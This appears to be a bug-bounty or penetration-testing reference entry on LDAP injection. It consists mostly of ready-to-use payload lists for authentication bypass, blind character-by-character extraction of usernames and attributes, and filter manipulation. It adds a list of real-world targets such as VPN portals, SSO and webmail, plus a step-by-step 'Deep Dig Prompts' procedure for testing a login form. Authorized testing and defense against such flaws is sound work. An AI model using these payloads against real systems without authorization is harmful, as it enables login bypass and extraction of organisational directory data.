---
id: "ldap-injection"
title: "LDAP Injection Attacks"
type: "technique"
category: "web-application"
subcategory: "injection"
tags: ["ldap", "injection", "authentication-bypass", "active-directory", "blind-injection", "deep-dig"]
platforms: ["linux", "macos", "windows"]
related: ["auth-bypass-payloads", "nosql-injection"]
difficulty: "intermediate"
updated: "2026-04-14"
---

# LDAP Injection Attacks

## Why LDAP Injection Matters
LDAP backends power Active Directory, employee directories, and corporate SSO. Injection here means auth bypass and org-wide data extraction. Bounties: $2k–$15k+.

## Authentication Bypass Payloads
```
# Original filter: (&(uid=USER)(userPassword=PASS))
*)(&
*)(|(&
*()|%26'
admin)(&)
admin)(|(password=*))
*)(uid=*))(|(uid=*
)(cn=))(|(cn=*
*))(|(objectClass=*
admin))(|(objectclass=*)
' or '1'='1
```

## Blind LDAP Injection
```
# Extract attribute values character by character
*)(uid=a*          # Check if any uid starts with 'a'
*)(uid=ad*         # Narrowing down
*)(uid=adm*
*)(uid=admin*

# Attribute existence test
*)(telephoneNumber=*
*)(mail=*
*)(userPassword=*

# Count entries
*)(uid=*           # Returns all — check response size difference

# Numeric extraction
*)(uidNumber=1*)
*)(uidNumber=10*)
*)(uidNumber=100*)
```

## Filter Manipulation
```
# OR-based bypass — inject into uid field:
admin)(|(uid=*
# Result: (&(uid=admin)(|(uid=*)(userPassword=anything))

# Wildcard authentication:
*
# Result: (&(uid=*)(userPassword=*)) — matches any user

# Null password bypass:
admin)(&)
# Result: (&(uid=admin)(&))(userPassword=ignored)
```

## Where to Find This
- Login forms backed by Active Directory or OpenLDAP
- Employee directories / people search features
- Corporate webmail address books (Zimbra, etc.)
- SSO/SAML implementations with LDAP backends
- Self-service password reset portals
- VPN web portals (Fortinet, Cisco ASA)
- ITSM tools (ServiceNow, custom LDAP integrations)

## Deep Dig Prompts
```
Given this login form [describe]:
1. Test for LDAP by injecting *)(& in username field
2. Check if wildcard * returns different response than invalid user
3. If blind: extract usernames char-by-char using *)(uid=a*, *)(uid=b*
4. Test for attribute enumeration: *)(mail=*, *)(telephoneNumber=*
5. Try authentication bypass: admin)(|(password=*))
```

## Tools
- ldapsearch (manual testing)
- Burp Suite with LDAP injection payloads
- Nmap `ldap-search` NSE script
- Custom Python with python-ldap for blind extraction
- nuclei LDAP injection templates
